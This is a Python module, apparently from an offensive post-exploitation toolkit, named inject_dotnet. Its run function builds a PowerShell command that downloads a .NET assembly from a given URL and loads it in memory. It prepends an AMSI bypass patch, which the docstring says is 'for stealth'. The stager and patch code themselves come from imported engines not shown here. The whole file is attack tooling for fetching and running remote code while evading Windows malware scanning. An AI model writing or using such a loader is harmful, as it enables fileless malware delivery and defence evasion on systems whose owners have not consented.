"""
modules/inject_dotnet.py — .NET Assembly Reflective Loading Module

Generates a PowerShell command that downloads a .NET assembly (EXE/DLL)
and loads it entirely in memory via Reflection.Assembly.Load().
Prepends an AMSI patch for stealth.
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from loader_engine import LoaderEngine
from patch_engine import PatchEngine

MODULE_INFO = {
    "name": "inject_dotnet",
    "description": "Reflective .NET assembly load (Windows, in-memory)",
    "author": "Hider",
    "platform": "windows",
}


def run(session, args):
    """
    args[0] = URL to .NET assembly (EXE/DLL)
    """
    if not args or len(args) < 1:
        return "[!] Usage: inject_dotnet <assembly_url>"
    url = args[0]
    # Prepend AMSI bypass
    amsi = PatchEngine.amsi_patch(obfuscate=False)
    loader = LoaderEngine.ps_pe_stager(url, obfuscate=False)
    return f"{amsi}\n\n{loader}"
